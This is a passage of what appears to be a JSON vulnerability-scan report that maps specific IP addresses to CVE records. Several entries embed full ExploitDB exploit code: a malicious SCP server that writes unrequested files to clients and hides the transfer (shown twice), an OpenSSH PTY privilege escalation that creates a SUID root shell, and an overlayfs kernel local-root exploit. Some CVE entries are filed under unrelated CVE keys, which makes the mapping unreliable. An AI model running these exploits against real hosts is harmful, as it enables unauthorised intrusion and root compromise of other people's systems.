authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.1.52.100": {},
    "152.1.52.119": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.52.182": {
        "CVE-2020-1927": []
    },
    "152.1.52.213": {
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ],
        "CVE-2015-6563": [
            {
                "source": "CVE",
                "_id": "2015-6563",
                "description": "The monitor component in sshd in OpenSSH before 7.0 on non-OpenBSD platforms accepts extraneous username data in MONITOR_REQ_PAM_INIT_CTX requests, which allows local users to conduct impersonation attacks by leveraging any SSH login access in conjunction with control of the sshd uid to send a crafted MONITOR_REQ_PWNAM request, related to monitor.c and monitor_wrap.c.",
                "osvdb": [],
                "bid": [
                    76317
                ],
                "cve": [
                    "CVE-2015-6563"
                ],
                "msb": []
            }
        ],
        "CVE-2015-6564": [
            {
                "source": "CVE",
                "_id": "2015-6564",
                "description": "Use-after-free vulnerability in the mm_answer_pam_free_ctx function in monitor.c in sshd in OpenSSH before 7.0 on non-OpenBSD platforms might allow local users to gain privileges by leveraging control of the sshd uid to send an unexpectedly early MONITOR_REQ_PAM_FREE_CTX request.",
                "osvdb": [],
                "bid": [
                    76317
                ],
                "cve": [
                    "CVE-2015-6564"
                ],
                "msb": []
            }
        ],
        "CVE-2015-6565": [
            {
                "source": "CVE",
                "_id": "2015-6565",
                "description": "sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY devices, which allows local users to cause a denial of service (terminal disruption) or possibly have unspecified other impact by writing to a device, as demonstrated by writing an escape sequence.",
                "osvdb": [],
                "bid": [
                    76497
                ],
                "cve": [
                    "CVE-2015-6565"
                ],
                "msb": []
            },
            {
                "code": "/* \r\n *  not_an_sshnuke.c\r\n *\r\n *  Federico Bento\r\n *\r\n *  up201407890 () alunos dcc fc up pt\r\n *  https://twitter.com/uid1000\r\n * \r\n *  OpenSSH 6.8-6.9 local privilege escalation - CVE-2015-6565\r\n *  \r\n *  Considered mostly to be a \"DoS\", turns out to be a priv esc vuln.\r\n *  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6565\r\n *\r\n *  Shoutz to Jann Horn for the detailed analysis\r\n *  And also to all my elite colleagues, specially xSTF :)\r\n *\r\n *\r\n *  $ gcc not_an_sshnuke.c -o not_an_sshnuke\r\n *  $ ./not_an_sshnuke /dev/pts/3\r\n *  [*] Waiting for slave device /dev/pts/3\r\n *  [+] Got PTY slave /dev/pts/3\r\n *  [+] Making PTY slave the controlling terminal\r\n *  [+] SUID shell at /tmp/sh\r\n *  $ /tmp/sh --norc --noprofile -p\r\n *  # id\r\n *  euid=0(root) groups=0(root)\r\n *\r\n */\r\n\r\n#include <sys/types.h>\r\n#include <sys/stat.h>\r\n#include <fcntl.h>\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n#include <sys/ioctl.h>\r\n     \r\nint main(int argc, char *argv[])\r\n{\r\n     char *cmd = \"cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\\n\";\r\n     int pid, pts = -1;\r\n\r\n     if(argc != 2) {\r\n          fprintf(stderr, \"Usage: %s /dev/pts/X\\n\", argv[0]);\r\n\t  fprintf(stderr, \"Where X is next slave device to be created\\n\");\r\n\t  return 1;\r\n     }\r\n\t\r\n     if(!access(argv[1], F_OK)) {\r\n          fprintf(stderr, \"[-] %s device already exists\\n\", argv[1]);\r\n          return 1;\r\n     }\r\n\r\n     pid = fork();\r\n\r\n     if(pid < 0) {\r\n\t  fprintf(stderr, \"[-] fork failed\\n\");\r\n\t  return 1;\r\n     }\r\n\t\r\n     if(pid == 0) {\r\n          printf(\"[*] Waiting for slave device %s\\n\", argv[1]);\r\n\t\t\r\n\t  /* win the race by opening the PTY slave before sshd's child */\r\n\t  while(pts == -1)\r\n\t       pts = open(argv[1], O_WRONLY); \r\n\r\n\t       printf(\"[+] Got PTY slave %s\\n\", argv[1]);\r\n               printf(\"[+] Making PTY slave the controlling terminal\\n\");\r\n\t\t\r\n\t       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);\r\n\t       setsid();\r\n               ioctl(0, TIOCSCTTY, 1);\r\n\r\n\t       while(*cmd)\r\n\t            ioctl(0, TIOCSTI, cmd++);\r\n     }\r\n\r\n     else {\r\n          wait(NULL);\r\n\t  printf(\"[+] SUID shell at /tmp/sh\\n\");\r\n\t  return 0;\r\n     }\r\n}",
                "description": "OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation",
                "author": "Federico Bento",
                "_id": 41173,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-26T00:00:00+00:00",
                "cve": [
                    "CVE-2015-6565"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2016-0777": [
            {
                "source": "CVE",
                "_id": "2016-10119",
                "description": "Firejail uses 0777 permissions when mounting /tmp, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10119"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-10120",
                "description": "Firejail uses 0777 permissions when mounting (1) /dev, (2) /dev/shm, (3) /var/tmp, or (4) /var/lock, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10120"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-0777",
                "description": "The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.",
                "osvdb": [],
                "bid": [
                    80695
                ],
                "cve": [
                    "CVE-2016-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-8605",
                "description": "The mkdir procedure of GNU Guile temporarily changed the process' umask to zero. During that time window, in a multithreaded application, other threads could end up creating files with insecure permissions. For example, mkdir without the optional mode argument would create directories as 0777. This is fixed in Guile 2.0.13. Prior versions are affected.",
                "osvdb": [],
                "bid": [
                    93510
                ],
                "cve": [
                    "CVE-2016-8605"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "code": "/*\r\njust another overlayfs exploit, works on kernels before 2015-12-26\r\n\r\n# Exploit Title: overlayfs local root\r\n# Date: 2016-01-05\r\n# Exploit Author: rebel\r\n# Version: Ubuntu 14.04 LTS, 15.10 and more\r\n# Tested on: Ubuntu 14.04 LTS, 15.10\r\n# CVE : CVE-2015-8660\r\n\r\nblah@ubuntu:~$ id\r\nuid=1001(blah) gid=1001(blah) groups=1001(blah)\r\nblah@ubuntu:~$ uname -a && cat /etc/issue\r\nLinux ubuntu 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\r\nUbuntu 14.04.3 LTS \\n \\l\r\nblah@ubuntu:~$ ./overlayfail\r\nroot@ubuntu:~# id\r\nuid=0(root) gid=1001(blah) groups=0(root),1001(blah)\r\n\r\n12/2015\r\nby rebel\r\n\r\n6354b4e23db225b565d79f226f2e49ec0fe1e19b\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <sched.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n#include <linux/sched.h>\r\n#include <sys/wait.h>\r\n\r\nstatic char child_stack[1024*1024];\r\n\r\nstatic int\r\nchild_exec(void *stuff)\r\n{\r\n    system(\"rm -rf /tmp/haxhax\");\r\n    mkdir(\"/tmp/haxhax\", 0777);\r\n    mkdir(\"/tmp/haxhax/w\", 0777);\r\n    mkdir(\"/tmp/haxhax/u\",0777);\r\n    mkdir(\"/tmp/haxhax/o\",0777);\r\n\r\n    if (mount(\"overlay\", \"/tmp/haxhax/o\", \"overlay\", MS_MGC_VAL, \"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\") != 0) {\r\n\tfprintf(stderr,\"mount failed..\\n\");\r\n    }\r\n\r\n    chmod(\"/tmp/haxhax/w/work\",0777);\r\n    chdir(\"/tmp/haxhax/o\");\r\n    chmod(\"bash\",04755);\r\n    chdir(\"/\");\r\n    umount(\"/tmp/haxhax/o\");\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char **argv)\r\n{\r\n    int status;\r\n    pid_t wrapper, init;\r\n    int clone_flags = CLONE_NEWNS | SIGCHLD;\r\n    struct stat s;\r\n\r\n    if((wrapper = fork()) == 0) {\r\n        if(unshare(CLONE_NEWUSER) != 0)\r\n            fprintf(stderr, \"failed to create new user namespace\\n\");\r\n\r\n        if((init = fork()) == 0) {\r\n            pid_t pid =\r\n                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);\r\n            if(pid < 0) {\r\n                fprintf(stderr, \"failed to create new mount namespace\\n\");\r\n                exit(-1);\r\n            }\r\n\r\n            waitpid(pid, &status, 0);\r\n\r\n        }\r\n\r\n        waitpid(init, &status, 0);\r\n        return 0;\r\n    }\r\n\r\n    usleep(300000);\r\n\r\n    wait(NULL);\r\n\r\n    stat(\"/tmp/haxhax/u/bash\",&s);\r\n\r\n    if(s.st_mode == 0x89ed)\r\n        execl(\"/tmp/haxhax/u/bash\",\"bash\",\"-p\",\"-c\",\"rm -rf /tmp/haxhax;python -c \\\"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\\\"\",NULL);\r\n\r\n    fprintf(stderr,\"couldn't create suid :(\\n\");\r\n    return -1;\r\n}",
                "description": "Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)",
                "author": "rebel",
                "_id": 39166,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-01-05T00:00:00+00:00",
                "cve": [
                    "CVE-2015-8660"
                ],
                "type": "local",
                "port": 0
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            },
            {
